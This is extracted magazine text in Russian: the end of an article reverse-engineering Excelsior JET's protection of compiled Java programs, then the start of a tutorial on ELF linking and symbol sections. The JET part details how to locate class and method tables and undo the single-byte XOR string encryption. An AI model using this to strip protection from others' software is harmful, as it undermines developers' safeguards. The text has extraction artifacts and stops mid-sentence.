                mov     rbx, rdx
                mov     ebp, r8d
                call    sub_9C4500                ; Инициализация
указателей на таблицу описателей классов
                jmp     short loc_9BA6A3
; --------------------------------------


loc_9BA66A:                              ; CODE XREF:
sub_9BA640+6B↓j
                mov     rcx, rax
                mov     rsi, rax
                call    sub_9C4540     ; Возвращает RAX — адрес
текущего описателя класса
                mov     ecx, [rax+74h]
                and     ecx, 20h
                cmp     ecx, 20h       ; Если бит 20h в двойном
слове по смещению 74h от начала описателя класса установлен —
название класса уже расшифровано
                jz      short loc_9BA6A0
                mov     ecx, [rax+14h] ; Двойное слово по
смещению 14h от начала описателя класса — смещение до
зашифрованного имени
                movsxd  rcx, ecx
                add     rcx, rax       ; Абсолютный адрес строки
имени в ECX
                mov     rdx, rcx       ; И в RDX тоже
                mov     r8d, ebp       ; Байт-шифровальщик F9h
                mov     rdi, rax
                call    sub_93A540     ; Расшифровать имя
                mov     eax, [rdi+74h]
                or      eax, 20h
                mov     [rdi+74h], eax ; Установить флаг
расшифрованности имени


                ...
                cmp     ecx, edx
                jle     short loc_9BA66A ; Следующий класс
                ...
                retn
sub_9BA640      endp

Итак, мы наконец-то получили локализацию строки имени внут ри описателя
класса — относитель ное смещение до него. Попут но мы обнаружили еще одну
интересную струк туру, адрес которой дан ная процеду ра получает на вход.
Назовем ее условно «струк тура CDES» по сиг натуре 53454443h в начале. Выг -
лядит она так.





                            Струк тура CDES

Это самая базовая струк тура Excelsior JET. Помимо байта, которым шифруют ся
тек стовые строки (выделен красным), в ней присутству ют ссылки на все
базовые струк туры и таблицы. Находит ся она по смещению 8 от начала сек ции
_bss и, к сожалению, не инициализирована в исходном коде. К вопросу ее ини-
циализации и получения из нее интересу ющих нас струк тур и таблиц мы вер-
немся чуть позже, для начала же попробу ем локализовать таблицу описателей
классов. Нем ного повозившись с процеду рой sub_9C4500, находим внут ри
следующий код:


                mov     rax, [rdx+0C0h]  ; Адрес таблицы
описателей классов по смещению 0C0h от начала структуры CDES (на
предыдущем рисунке выделено синим)
                ...
                mov     edx, [rax-2Ch]   ; Номер первого
рассматриваемого элемента в таблице — по смещению -2Ch от начала
таблицы (на следующем рисунке выделено синим)
                mov     [rcx+10h], edx
                mov     edx, [rax-2Ch]   ; Номер первого
рассматриваемого элемента в таблице — по смещению -2Ch от начала
таблицы (на следующем рисунке выделено синим)
                mov     r8d, [rax-28h]   ; Количество
рассматриваемых элементов в таблице — по смещению -28h от начала
таблицы (на следующем рисунке выделено зеленым)
                lea     eax, [rdx+r8]    ; Номер последнего
рассматриваемого элемента в таблице (на следующем рисунке
выделено красным)
                sub     eax, 1
                mov     [rcx+14h], eax
                jmp     short loc_9C44C7
; --------------------------------------


loc_9C44BE:                              ; В цикле перебираем все
элементы таблицы, начиная с первого рассматриваемого, на предмет
принадлежности к описателям класса
                mov     eax, [rcx+10h]
                add     eax, 1
                mov     [rcx+10h], eax


loc_9C44C7:                              ; CODE XREF:
sub_9C4480+3C↑j
                mov     rax, [rcx]
                mov     edx, [rcx+10h]
                mov     rax, [rax+rdx*8]
                movsx   edx, word ptr [rax+8]
                cmp     edx, 3             ; У описателей класса
16-битное слово по смещению 8 от начала структуры должно быть 3
                jz      short loc_9C44E3
                movsx   edx, word ptr [rax+8]
                cmp     edx, 4
                jnz     short sub_9C4480  ; ...или 4


loc_9C44E3:                              ; CODE XREF:
sub_9C4480+58↑j
                mov     [rcx+18h], rax    ; Если элемент таблицы
удовлетворяет этим условиям, возвращаем его адрес
                jmp     short locret_9C44FE

Сама таблица описателей классов выг лядит так.





                     Таблица описателей классов




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                      ИЗУЧАЕМ ЗАЩИТУ EXCELSIOR JET
                           ДЛЯ ПРОГРАММ НА JAVA




Су дя по всему, в ней содержатся не толь ко описатели классов, но еще и мно-
жество дру гих элемен тов, назначение которых ты можешь при желании выяс-
нить самостоятель но. Нас же пока интересу ют ее элемен ты, начиная с номера,
выделен ного на рисун ке синим цветом. Однако и эти элемен ты вовсе не обя-
затель но описатели классов, надо вниматель но смот реть на флажки в заголов-
ке струк туры.
   Теперь вернемся к инициализации «струк туры-40». Записи «струк туры-40»
хоть в исходном коде и не инициализированы, однако расположены по вполне
фик сирован ным адресам, на которые можно ставить бряки. Для примера
берем первый же адрес 9F2E060 из одной такой процеду ры. По остановке
в дан ной точке мы получаем процеду ру, инициализиру ющую «струк туры-40»
для каждого метода задан ного класса. Насколь ко я понимаю, это происходит
каждый раз при создании объекта. В упрощен ном виде эта процеду ра выг -
лядит примерно так (интересные места я выделил ком ментариями):


sub_936500      proc near
                ...



loc_936576:                              ; Цикл по всем элементам
таблицы методов класса
                ...
                mov     [r11], r9       ; Место, на котором
срабатывает breakpoint, R9-адрес текущего описателя класса — по
смещению 0 «структуры-40»
                ...
                mov     ebp, [r9+0B0h]  ; Относительный адрес
таблицы методов находится по смещению B0h внутри описателя класса
                test    ebp, ebp
                jz      short loc_93673D
                movsxd  rbp, ebp
                and     rbp, rax
                mov     rsi, [r9+30h]   ; По смещению 30h внутри
описателя класса — указатель на «структуру CDES»
                mov     rsi, [rsi+58h]  ; По смещению 58h внутри
«структуры CDES» — базовый адрес исполняемого модуля 400000h, на
рисунке «Структура CDES» выделен оранжевым
                add     rbp, rsi        ; Абсолютный адрес
таблицы методов класса в RBP
                jmp     short loc_93673F
; --------------------------------------


loc_93673D:                              ; CODE XREF:
sub_936500+228↑j
                xor     ebp, ebp


loc_93673F:                              ; CODE XREF:
sub_936500+23B↑j
                test    rbp, rbp
                jz      short loc_936764
                mov     ebx, [rbp+rbx*4+0]  ; RBP[RBX] —
относительный адрес текущего метода
                test    ebx, ebx
                jz      short loc_93675F
                movsxd  rbx, ebx
                mov     r9, [r9+30h]        ; По смещению 30h
внутри описателя класса — указатель на «структуру CDES»
                and     rbx, rax
                mov     r9, [r9+58h]        ; По смещению 58h
внутри «структуры CDES» — базовый адрес исполняемого модуля
400000h, на рисунке «Структура CDES» выделен оранжевым
                add     r9, rbx              ; Абсолютный адрес
текущего в R9
                ...
                mov     [rdx+r10+18h], r9   ; Адрес метода по
смещению 18h «структуры-40»
                ...
                jnz     loc_936576           ; Перейти к обработке
следующего метода класса и следующего блока «структуры-40»

Разумеется, описан ная процеду ра значитель но сложнее и выполняет множес-
тво дру гих фун кций, но на дан ный момент мы ищем вполне определен ные
фичи,  и, похоже, мы их наш ли. Резюмируя, попробу ем для наг лядности
нарисовать примерную схему описателя класса.





                      Описатель класса

На этом рисун ке оран жевым обозначен тип блока (описатель класса —
3 или 4), красным — имя класса и смещение на него относитель но начала опи-
сателя, зеленым — указатель на таблицу описателей классов, синим — таб-
лица методов класса и смещение на нее относитель но базового адреса.
  Ко всему прочему мы выяснили еще один интересный факт. Несмотря на то
что нативное приложение 64-бит ное, адреса методов внут ри описателя клас-
сов — 32-бит ные смещения относитель но базового адреса модуля. На самом
деле, если вниматель но присмотреть ся, мы найдем в описателе класса таб-
лицу с прямыми длин ными ссылками (как я понимаю, на методы из внеш них
классов), но нам она в дан ный момент не нужна.
  Не знаю, как создатели приложения вык ручиваются в слу чае с боль шими
исполняемы ми модулями, не адресуемы ми 32 битами. Возможно, они имеют
несколь ко сек ций и  «струк тур CDES». Мне, во всяком  слу чае, таковые
не попадались, поэтому вернемся к нашим баранам, то бишь к жабам ;)
  Мы разобрали, какие классы ском пилированы в нативный код приложения
и какие методы соот ветству ют каждому классу. Но хотелось бы знать имена
этих методов. Ведь я уже упоминал в начале статьи, что приложение при воз-
никновении исключения лег ко показы вает стек вызовов с полными названиями
классов, методов, с именами исходных файлов и даже с номерами строк. Пос-
ледние, конечно, нам не особо нужны, но имена методов знать бы хотелось.
   Направление, в котором следует копать в дан ном слу чае, очевид но: если
обработ чик исключений знает имена классов — спросим его об этом! Пос-
коль ку мы теперь знаем адреса методов каждого класса, тупо ставим бряки
на всякий слу чай на все методы класса. Ну, например, на Throwable, а еще
лучше на StackTrace.
  Поискав в памяти заг ружен ного модуля, мы находим такой класс — его
полное имя com/excelsior/jet/runtime/excepts/stacktrace/StackTrace.
Методов у этого класса нем ного, поряд ка двад цати, поэтому, просто уста-
новив точки останова на каждый из них, получаем срабаты вание по адресу
D193C0.
   Указан ный метод по адресу возврата определяет имя метода, из которого
был выполнен вызов, имя исходного Java-файла, содержащего этот метод,
и номер строки. Забегая вперед, скажу, что его полное имя com/excelsior/
jet/runtime/excepts/stacktrace/StackTrace/a,   и,  к  сожалению,  код
перед целевой ком пиляцией обфусцирует ся. Схематически он выг лядит вот
так:


sub_D193C0      proc near               ; На входе в RDX — адрес
возврата со стека почему-то минус 1, то есть адрес байта,
предшествующего адресу возврата из call
                ...
                mov     rcx, [rax+30h] ; RCX       <- Адрес CDES
                mov     r9, [rcx+0E8h] ; CDES[E8h] — таблица имен
методов по адресам, на рисунке «Структура CDES» выделена
фиолетовым
                test    r9, r9
                jz      loc_D19667
                mov     r10d, [r9]
                test    r10d, r10d
                jz      loc_D19667
                test    rdx, rdx
                jz      short loc_D19411
                mov     r10, [rcx+58h] ; Базовый адрес
исполняемого модуля
                sub     rdx, r10       ; RDX <- относительный
адрес возврата
                ...
                call    sub_D1A100 ; Эта процедура ищет в таблице
имен методов по адресам относительный адрес RDX, то есть участок
кода, внутри которого он находится
                test    rax, rax   ; На выходе в RAX — абсолютный
адрес найденного элемента таблицы имен методов по адресам,
содержащего адрес возврата
                jz      loc_D19662
                mov     ecx, 0FFFFFFFFh
                mov     edx, [rax+8] ; 32-битное слово по
смещению 8 в найденном элементе — относительный адрес структуры
описания метода
                test    edx, edx
                jz      short loc_D1944D
                movsxd  rdx, edx
                and     rdx, rcx
                mov     r8, [rsi+58h]  ; Базовый адрес
исполняемого модуля
                add     rdx, r8        ; Получаем абсолютный
адрес структуры описания метода
                jmp     short loc_D1944F
; --------------------------------------


loc_D1944D:                              ; CODE XREF:
sub_D193C0+7C↑j
                xor     edx, edx


loc_D1944F:                              ; CODE XREF:
sub_D193C0+8B↑j
                mov     eax, [rax]      ; 32-битное слово по
смещению 0 найденного элемента таблицы — стартовый адрес метода
                sub     ebx, eax        ; Смещение от начала
метода до адреса возврата
                mov     r8, rcx
                mov     rcx, rdx
                mov     edx, ebx
                mov     r12, rcx
                mov     r13, r8
                call    sub_D1A000      ; Методом половинного
деления ищем в структуре описания метода номер строки по
относительному смещению адреса возврата
                ,,,


                mov     ecx, [rax+4]    ; Номер строки исходного
Java-файла
                mov     edx, [r12+4]    ; Индекс зашифрованной
строки имени метода
                mov     eax, [r12+8]    ; Индекс зашифрованной
строки имени исходного Java-файла, содержащего метод
                ...


                retn
sub_D193C0      endp

Надеюсь, к настоящему момен ту я тебя не слиш ком напугал обилием новых
струк тур с собствен ными именами? Как ты, вероятно, заметил, приведен ный
выше кусок кода содержит целых три новых термина: таблица имен методов
по адресам, струк тура описания метода и индекс зашифрован ной строки.
Остановим ся на каждом из них под робнее.
   Чтобы при возникновении ошибки отследить метод и строку вызова,
Excelsior Jet хранит упорядочен ные таблицы соот ветствия адрес — метод,
и для каждого метода существу ет таблица «адрес — строка». Таблица соот -
ветствия имен методов по адресам, как ты уже догадался, абсолют но адре-
сует ся из «струк туры CDES» 64-бит ным адресом по смещению E8h. На рисун -
ке «Струк тура CDES» она выделена фиолетовым. Струк тура у нее совершенно
прозрачная, она показана на следующей иллюстрации.





             Таблица соот ветствия имен методов по адресам

Первое 32-бит ное слово (выделено красным) — количество элемен тов в таб-
лице. Каждый элемент занимает 12 байт (первые два элемен та выделены
фиолетовым) и соот ветству ет одному ском пилирован ному методу. Первое 32-
бит ное слово элемен та (выделено желтым) — относитель ный адрес точки вхо-
да метода. Последнее 32-бит ное слово (выделено голубым) — относитель ный
адрес струк туры описания метода.
   Как вид но, здесь применен такой же мухлеж с 32-бит ной адресацией кода
и дан ных внут ри 64-бит ного приложения: вместо нормаль ных 64-бит ных адре-
сов исполь зуют ся 32-бит ные смещения относитель но базы модуля, храняще-
гося в «струк туре CDES».
  Вернемся ко второй найден ной струк туре — струк туре описания метода,
которую я так назвал из-за скуд ности собствен ной фан тазии. Она не слиш ком
отличает ся от таблицы имен методов по адресам и тоже пред ставляет собой
упорядочен ную таблицу c размером в начале (выделено красным) и 12-бай-
товым элемен том (первый элемент выделен фиолетовым).





                       Струк тура описания метода

От личие от предыду щей таблицы состоит в том, что в самом начале струк туры
описания метода идут три 32-бит ных слова. Первое из них (на рисун ке обве-
дено оран жевым) — индекс класса, содержащего метод в таблице описателей
классов. Второе (обведено синим) — индекс зашифрован ного имени метода,
а третье (обведено зеленым) — индекс зашифрован ного имени исходного
Java-файла.
  Записи устроены следующим образом. Первый 32-бит ный элемент — сме-
щение  кода, в который ком пилиру ется Java-строка относитель но начала
метода, второй — номер строки в исходном Java-файле, а третий, судя по все-
му, не задействован вообще, посколь ку я не видел его ненулевых значений.
Посколь ку обе описан ные струк туры пред ставляют собой упорядочен ные мас-
сивы (по сути, упорядочен ные словари), любое место кода быстро и однознач-
но иден тифицирует ся по ним методом дихотомии.
   Таким образом, можно значитель но облегчить реверс ском пилирован ных
приложений, просто пробежавшись по этим двум струк турам и расставив
в коде мет ки соот ветствия классам, методам и строкам. Предоставляю тебе
самостоятель но занять ся написанием подобных скриптов или плагинов, а нам
осталось разобрать ся, что означает индекс зашифрован ной строки из ком -
ментария к предыду щему фраг менту кода.
   Как я уже говорил, из-за паранойи разработ чиков в Excelsior Jet, помимо
имен классов, шифруют ся вообще все-все-все тек стовые строки, причем
одним и тем же алгорит мом — тупым XOR с хранящим ся в «струк туре CDES»
байтом-шифроваль щиком (у нас это F9h). Но если имена классов стоят на сво-
их местах в соот ветству ющих струк турах описания класса, то почти все осталь -
ные строки собраны в одном зашифрован ном блоке, на который указывает
абсолют ный адрес по смещению C8h в «струк туре CDES» (на рисун ке «Струк -
тура CDES» выделено зеленым). Таким образом, упомяну тые выше индексы
пред ставляют собой смещения относитель но начала этого блока. Здесь я сно-
ва обращу твое внимание: создатели ком пилятора явно делают допущение,
что в любом 64-бит ном приложении размер этого блока будет адресовать -
ся 32 битами.
  И в зак лючение для тех, кого эта нем ного сум бурная статья вдохновила
написать более дру жествен ный к поль зователю деком пилятор, скрипт или пла-
гин к отладчику, вернемся к вопросу поиска и локализации основных струк тур
дан ных, упомяну тых в статье. Как я уже говорил, основная «струк тура CDES»,
из которой идут ссылки на главные струк туры, блоки и таблицы, инициализиру -
ется после запуска прог раммы. То есть в уже запущен ной прог рамме все эти
адреса посмотреть можно, но из дизассем блера придет ся искать. Попробу ем
это сделать. Инициализиру ется эта струк тура в самое начало сек ции _bss,
при помощи IDA мы лег ко находим код инициализации:


sub_743B80      proc near                ; CODE XREF:
sub_743FA0+25↓p
                mov     dword ptr [rcx], 53454443h      ;
Сигнатура  CDES
                ...
                lea     rax, unk_9E31718                 ;
Hardcoded-адрес таблицы описателей классов
                mov     [rcx+0C0h], rax
                lea     rax, unk_14F3F6F4                ;
Hardcoded-адрес блока зашифрованных строк
                mov     [rcx+0C8h], rax
                lea     rax, unk_15718A54
                mov     [rcx+0D0h], rax
                lea     rax, unk_9ED8428
                mov     [rcx+0E0h], rax
                lea     rax, aExfs      ; "EXFS\a"
                mov     [rcx+0D8h], rax
                lea     rax, unk_1571F50C
                mov     [rcx+0E8h], rax                  ;
Hardcoded-адрес таблицы имен методов по адресам

Стратегия поиска  такова: ищем  в коде адрес присваивания  сиг натуры
53454443h и, начиная с этого места, по маскам команд и смещений извлекаем
нужные адреса. Идея весь ма сколь зкая, посколь ку в каждой новой версии ком -
пилятора авторы могут менять этот инициализационный код, из-за чего нам
придет ся перерабаты вать алгоритм, но как рабочий вариант такой под ход сго-
дит ся.
   Ты, наверное, заметил, что байт-шифроваль щик F9h тоже не инициализиру -
ется в этой процеду ре, он берет ся из дру гой стран ной струк туры, находящейся
в самом начале сек ции _config с сиг натурой CPB.





                              Струк тура

Как видишь, смещение этого байта в струк туре равно 1Ch. Последний кусочек
пазла встал на место, и остается толь ко пожелать удачи энту зиастам реверса
этого хит рого ком пилятора.
ВЗЛОМ





       РАЗБИРАЕМ УСТРОЙСТВО
            ELF-ФАЙЛОВ
         В ПОДРОБНОСТЯХ





Исполня емые фай лы в ОС семей ства Linux
имеют довольно сложную струк туру. Важ-
ный аспект в работе таких при ложений —
вза имо дей ствие с внеш ними библиоте-
ками и вызыва емы ми из них фун кци ями.        Евгений Дроботун                                                                             Постоянный автор «Хакера»
Сегод ня мы погово рим о том, как обес-
печива ется такое вза имо дей ствие и каким
обра зом исполня емый файл может быть
свя зан с библиотеками.




                     Это продол жение статьи « Ана томия эльфов. Раз-
                      бира емся с внут ренним устрой ством ELF-фай -
                       лов», в которой мы начали изу чать секреты фор-
                      мата исполня емых ELF-фай лов. В ней мы опре-
                      дели лись с инс тру ментари ем ана лиза, создали
                       нес колько подопыт ных экземпля ров ELF-фай лов,
                       разоб рались с форматом заголовка ELF-фай ла,
                        узна ли про таб лицы заголовков секций и сег -
                        ментов, а также заг лянули внутрь некоторых сек-
                     ций и сег ментов.



ÂÈÄÛ ÑÂßÇÛÂÀÍÈß

Основная проблема, возникающая при ком поновке исполняемого файла, —
определение адресов вызываемых в прог рамме фун кций, расположен ных
во внеш них библиотеках. Если для фун кций, которые определены в самом
исполняемом файле, такой проблемы не наблюдается (адреса этих фун кций
определяются уже на этапе ком пиляции), то внеш ние библиотеки могут
находить ся в памяти по боль шому счету где угод но. Это получается благодаря
возможности формировать позиционно независимый код. С ходу, на этапе
ком пиляции, определить адрес той или иной фун кции, содержащейся в такой
библиотеке, невозможно. Это можно сделать либо статически (включив нуж-
ные библиотеки непосредствен но в ELF-файл), либо динамически (во время
заг рузки или выполнения прог раммы).
  Исходя из этого, можно выделить три вида связывания исполняемого ELF-
файла с библиотеками:
 • статическое связывание;
 • динамическое связывание во время заг рузки файла;
 • динамическое связывание во время исполнения файла.

Если обратить ся к миру Windows, то там наблюдается примерно такая же кар-
тина и основные прин ципы фун кционирования этих видов связывания с внеш -
ними библиотеками аналогичны.
   Для статически лин куемых библиотек исполь зует ся расширение  .a  (в
Windows это файлы с расширением .lib), для динамических — расширение .so
(в Windows это файлы .dll).


Ñòàòè÷åñêîå ñâÿçûâàíèå
Здесь все достаточно просто. Внеш няя библиотека лин кует ся с исполняемым
файлом, образуя с ним единое целое. Если обратить ся к примеру из предыду -
щей статьи (файл с хелловорлдом example.c), то для того, чтобы сделать
из него прог рамму, статически связан ную с библиотекой glibc, нужно набрать
в кон соли следующее:


gcc -o example_static_linked -static example.c

В итоге получим исполняемый файл со статически прилин кован ной к нему
библиотекой glibc. Если ты обратишь внимание на размер получен ного файла,
то увидишь, что он существен но боль ше, чем размер файлов example_pie
и example_no_pie, которые были ском пилированы методом динамической
лин ковки с библиотекой glibc. У меня, например, получилось целых 872 Кбайт
для статической лин ковки, в то время как динамическая дала всего 17.
  Собствен но говоря, это и есть основной недостаток статического связыва-
ния. Несмотря на то что из glibc мы исполь зуем всего одну фун кцию puts(),
при  статическом  связывании  приходит ся  тащить  в  исполняемый  файл
еще много чего ненужного. Так же можно отметить еще один, не совсем явный
недостаток статической лин ковки: если появляет ся новая версия библиотеки (в
которой, например, устранена та или иная уязвимость), то нам придет ся
переком пилировать прог рамму уже с новой версией нужной нам библиотеки.
Если этого не делать, то наша прог рамма будет поль зовать ся фун кциями,
в которых уязвимость не устранена.
  Посмотреть тип связывания в исполняемом файле можно, применив ути-
литу le или ldd.





  Определяем тип связывания в ELF-файле (в дан ном слу чае видим, что
  применена статическая лин ковка)

Обрати внимание, что для примера example_static из предыду щей статьи
утилита le покажет динамическую лин ковку. Все дело в том, что в этом слу чае
мы  статически  лин ковали  с  прог раммой нашу  самописную библиотеку
lib_static_example.a,      в      которой     содержится     фун кция
hello_world_function(). Однако в этой фун кции исполь зует ся фун кция
puts(),    которая    берет ся    из   библиотеки     glibc,    связан ной
с lib_static_example.a уже динамически.


Äèíàìè÷åñêîå ñâÿçûâàíèå âî âðåìÿ çàãðóçêè ôàéëà
Как мы уже говорили, благодаря позиционно независимому коду динамичес-
кие (или разделяемые) библиотеки могут быть заг ружены в память один раз,
а все нуждающиеся в этой библиотеке прог раммы станут поль зовать ся этой
разделяемой копией библиотеки. На этапе ком поновки исполняемого файла
адреса, по которым будут заг ружены динамические библиотеки, неизвестны,
и поэтому адреса содержащихся в них фун кций определить невозможно.
  В этом слу чае динамический ком поновщик (если пом нишь, то путь к нему
лежит в сек ции .interp) определяет адреса нужных фун кций и перемен ных
в ходе заг рузки прог раммы в память. Если говорить точнее, во многих слу чаях
даже не в ходе заг рузки, а во время первого обращения к фун кции, но об этом
более под робно поговорим чуть ниже.


Äèíàìè÷åñêîå ñâÿçûâàíèå âî âðåìÿ èñïîëíåíèÿ ôàéëà
Разделяемые библиотеки могут быть заг ружены в память и во время выпол-
нения прог раммы. В этом слу чае приложение обращает ся к динамическому
лин ковщику с прось бой заг рузить и прилин ковать динамическую библиотеку.
В Linux для этого предусмотрены системные фун кции dlopen(), dlsym()
и dlclose(), первая заг ружает разделяемую библиотеку, вторая ищет в ней
нужную фун кцию, третья зак рывает ее файл.
   Если покопать ся во внут ренностях Windows, там можно обнаружить ана-
логичные   API-фун кции:   LoadLibrary()  и   GetProcAddress()   (либо
LdrLoadDll() и LdrGetProcAddress()).
   Этот вид связывания (как в Linux, так и в Windows) исполь зует ся достаточно
ред ко, во многих слу чаях его применяют для того, чтобы скрыть от исследова-
телей истинную фун кциональ ность прог раммы.


ÏÐÎÄÎËÆÀÅÌ ÐÀÇÁÈÐÀÒÜÑß Ñ ÑÅÊÖÈÎÍÍÛÌ ÏÐÅÄÑÒÀÂËÅÍÈÅÌ
ELF-ÔÀÉËÀ

В предыду щей статье мы рассмот рели несколь ко сек ций, которые может
содержать ELF-файл, однако изу чили мы их далеко не все. Сегод ня мы про-
должим исследовать этот вопрос и посмотрим в том числе, какие сек ции
в ELF-файле предусмотрены для организации связывания и разрешения адре-
сов фун кций, которые содержатся в разделяемых библиотеках.


Ñåêöèÿ .shstrtab
Эта сек ция пред ставляет собой массив строк, закан чивающихся нулем, с име-
нами всех сек ций ELF-файла. Указан ная таблица позволяет различным ути-
литам (например, таким, как readelf) находить имена сек ций. Для просмотра
этой сек ции в сим воль ном или шестнад цатеричном виде можно исполь зовать
опции -p или -x утилиты readelf соот ветствен но. Например, вот так:


readelf -x .shstrtab example_pie





          Сек ция .shstrtab в шестнад цатеричном пред ставлении


Ñèìâîëüíûå ñåêöèè
Как можно догадать ся по названию, сим воль ные сек ции хранят какие-то сим -
волы. В нашем слу чае под сим волами понимаются имена фун кций и перемен -
ных. Эти имена исполь зуют ся в качестве сим воль ных имен для пред ставления
определен ного местоположения в файле или в памяти. Все это вместе и обра-
зует то, что мы называем сим волами фун кций и дан ных. (Да, мы привык ли счи-
тать, что сим вол, как правило, занимает одно знакоместо в виде бук вы, цифры
или знака препинания, однако здесь это не так.)
   Чтобы посмотреть информацию о сим волах, можно восполь зовать ся уже
знакомой нам утилитой readelf и набрать в кон соли что-нибудь вроде этого:


readelf -s -W example_pie

На выходе увидим содержимое двух сек ций — .symtab и .dynsym.





           Вы вод сим воль ной информации из ELF-файла


Ñåêöèÿ .symtab
Для начала необходимо отметить, что наличие этой сек ции в ELF-файле необя-
затель но. Более того, в боль шинстве встречающихся в дикой природе файлов
она отсутству ет. Основное ее назначение — помощь при отладке прог раммы,
в то время как для исполнения файла она не требует ся. По умолчанию эта сек -
ция создает ся во время ком пиляции прог раммы, однако ее можно удалить
с помощью коман ды strip, например так:


strip example_pie

Теперь, если попытать ся посмотреть сим воль ную информацию в этом файле,
будет выведено толь ко содержимое сек ции .dynsym.





  Вы вод сим воль ной информации из ELF-файла, на который воздейство-
  вали утилитой strip

Все же, хоть эта сек ция и необязатель на в файле, остановим ся на ней чуть
под робнее.
   Каждая запись этой сек ции пред ставляет собой струк туру вида Elf32_Sym
или Elf64_Sym. Внут реннее устройство этой струк туры (как, впрочем, и содер-
жимое всех осталь ных струк тур и значений кон стант ELF-файлов) можно пос-
мотреть в файле /usr/include/elf.h.
  В  указан ной сек ции содержатся все сим волы, которые ком поновщик
исполь зует как во время ком пиляции, так и во время выполнения приложения.
В нашем примере example_pie среди всего, что содержится в дан ной сек ции,
можно увидеть сим воль ное имя знакомой нам фун кции main(), которая при-
сутству ет в любой прог рамме, а так же сим воль ное имя фун кции puts().





              Фун кции main() и puts() в сек ции .symtab

Фун кции main() соот ветству ет адрес 0x1149, и имен но с этого адреса фун -
кция будет начинать ся после заг рузки файла в память перед выполнением.
Так же вид но, что размер фун кции main() составляет 27 байт, ее тип — FUNC
(то есть фун кция), а сама фун кция размещается в сек ции с номером 16 (это
сек ция .text, в которой находит ся непосредствен но исполняемый код прог -
раммы).
  С фун кцией puts() такой определен ности не отмечает ся: нет ни адреса,
ни сек ции. Так происходит потому, что фун кция puts() находит ся в библиоте-
ке glibc и, как мы уже говорили, адрес этой фун кции на этапе ком пиляции
определить нель зя.
  Содержимое сек ции .symtab так же можно посмотреть и с помощью коман -
ды nm. Чтобы узнать под робности исполь зования этой коман ды, набери в тер-
минале


nm man

Если мы попробу ем посмотреть содержимое сек ции .symtab ELF-файла,
в котором применено статическое связывание, то увидим, что, помимо уже
знакомых нам сим волов фун кций main() и puts(), в сек ции присутству ет
боль шое количество сим волов дру гих фун кций, входящих в состав библиотеки
glibc.





  Фун кции main() и puts() в сек ции .symtab в ELF-файле со статической ком -
  поновкой

На рисун ке мы видим, что у фун кции main() признак связывания (который
содержится в поле st_info струк туры Elf32_Sym или Elf64_Sym) имеет зна-
чение STB_GLOBAL, а фун кция puts() — значение STB_WEAK. Значение приз-
нака связывания сим вола, равное STB_WEAK, говорит о том, что дан ный сим вол
имеет самый низкий приоритет при связывании (так называемый слабый сим -
вол). Сим волы с дру гими признаками связывания, например STB_LOCAL
или STB_GLOBAL, имеют более высокий приоритет (их называют силь ными сим -
волами).
  При связывании несколь ких библиотек в ходе ком поновки одного ELF-фай-
ла в несколь ких библиотеках может оказать ся определена фун кция с одинако-
вым именем (то есть сим волы этой фун кции в двух или более библиотеках
будут совпадать). В этом слу чае ком поновщик должен выбрать одну из этих
фун кций. Ког да есть одна фун кция с силь ными сим волами и одна или несколь -
ко фун кций со слабыми сим волами, будет выбрана фун кция с силь ными сим -
волами. Если имеется несколь ко одинаковых фун кций со слабыми сим волами,
ком поновщик выберет слу чайным образом. Если же в ходе ком поновки обна-
ружит ся две или более одинаковые фун кции с силь ными сим волами, то ком -
поновка прервется и будет кон статирована ошибка.
  В дан ном слу чае в библиотеке glibc сим волы многих стан дартных фун кций
определены с низким приоритетом (слабые сим волы). Это делается для того,
чтобы дать возможность прог раммистам написать собствен ную библиотеку
с переопределением некоторых стан дартных фун кций  (и, соот ветствен но,
с определением сим волов этих переопределен ных фун кций как силь ных).
Затем они смогут исполь зовать вместе и библиотеку glibc, и свою библиотеку
с переопределен ными фун кциями. При этом, посколь ку у переопределен ных
фун кций сим волы имеют более высокий приоритет, будут вызывать ся имен но
они, а не те, которые определены в glibc. Более под робно про силь ные и сла-
бые сим волы можно почитать в докумен тации.


Ñåêöèÿ .dynsym
Записи в дан ной сек ции имеют такую же струк туру, что и в сек ции .symtab.
Главное отличие в том, что в этой сек ции содержатся толь ко сим волы фун кций
или перемен ных, которые необходимы для динамической ком поновки. На эту
сек цию коман да strip никакого влияния не оказывает (что, в общем-то,
понят но). Сек ция .dynsym имеется в тех файлах, где исполь зует ся динамичес-
кое связывание во время заг рузки ELF-файла. Соот ветствен но, если попытать -
ся посмотреть наличие этой сек ции в файле со статической лин ковкой, то мы
ее там не увидим.
   Если вниматель но изу чить сек ции .symtab и .dynsym, можно заметить, что
в сек цию .dynsym из сек ции .symtab перекочевали сим волы c нулевы ми адре-
сами и неопределен ными номерами сек ций. Значения этих адресов и номеров
сек ций как раз и будут определены во время заг рузки прог раммы.
   Сек ция  .symtab имеет  тип  SHT_SYMTAB,  а  сек ция  .dynsym —  тип
SHT_DYNSYM. Собствен но, дан ный факт и позволяет утилите strip разобрать ся,
что можно зачистить в ELF-файле, а что нель зя.


Ñåêöèè .strtab è .dynstr
Указан ные сек ции содержат непосредствен но строковые значения сим волов,
на  которые  указывает  значение  st_name  из  струк туры  Elf32_Sym
или Elf64_Sym. Они, как было показано выше, являются элемен тами сек ций .
symtab или .dynsym. То есть в сек циях .symtab и .dynsym непосредствен но
самих строковых значений сим волов не содержится, а присутству ет толь ко
индекс, по которому и находит ся нужное строковое значение сим вола в сек -
циях .strtab или .dynstr (этот индекс как раз и лежит в поле st_name струк -
туры Elf32_Sym или Elf64_Sym).
  Посмотреть содержимое этих сек ций, так же как и для сек ции .shstrtab,
можно с исполь зованием опций -x или -p утилиты readelf.





  Вы вод содержимого сек ций .dynstr и .strtab из ELF-файла в шестнад -
  цатеричном и строковом виде

Более под робно про сим воль ные сек ции ELF-файлов можно почитать в до-
кумен тации Oracle.


ÄÈÍÀÌÈ×ÅÑÊÎÅ ÑÂßÇÛÂÀÍÈÅ È ÑÅÊÖÈÈ .PLT È .GOT

При динамическом связывании во время заг рузки в боль шинстве слу чаев раз-
решение находящихся в разделяемых библиотеках адресов фун кций происхо-
дит чуть позже, не в сам момент запуска приложения, а во время первого
обращения к неразрешен ному адресу при вызове необходимой фун кции.
Таким образом реализует ся так называемое позднее (или отложен ное) свя-
зывание.
   Для чего это нужно? Позднее связывание позволяет не тратить без необ-
ходимости время на разрешение адресов при запуске прог раммы. Для ее фун -
кционирования может пот ребовать ся много фун кций из разделяемых биб-
лиотек, и определять их адреса имен но тог да, ког да это действитель но необ-
ходимо, — вполне рациональ ное решение. В операционных системах семей-
